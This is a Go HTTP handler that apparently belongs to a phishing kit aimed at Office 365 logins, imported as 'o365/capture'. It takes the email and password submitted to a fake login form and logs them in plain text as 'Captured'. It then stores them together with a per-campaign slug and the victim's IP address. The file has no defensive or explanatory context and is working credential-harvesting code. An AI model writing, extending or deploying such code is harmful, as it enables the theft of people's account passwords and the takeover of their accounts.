package handlers

import (
	"log"
	"net/http"
	"o365/capture"
)

// CaptureHandler processes form data for login credentials
func CaptureHandler(w http.ResponseWriter, r *http.Request) {
	if err := r.ParseForm(); err != nil {
		http.Error(w, "Invalid capture", http.StatusBadRequest)
		return
	}

	// Extract the slug from the request context (provided by SlugMiddleware)
	slug, ok := r.Context().Value("slug").(string)
	if !ok {
		http.Error(w, "Slug not found in request context", http.StatusBadRequest)
		return
	}

	email := r.FormValue("email")
	pass := r.FormValue("password")

	if email == "" || pass == "" {
		http.Error(w, "Missing email or password", http.StatusBadRequest)
		return
	}

	log.Printf("🟢 Captured: %s → %s", email, pass)

	// Save the captured credentials and link them with the slug
	capture.SaveCreds(map[string]string{
		"login":  email,
		"passwd": pass,
		"slug":   slug, // Use the slug to ensure data isolation
	}, r.RemoteAddr)

	w.WriteHeader(http.StatusNoContent)
}
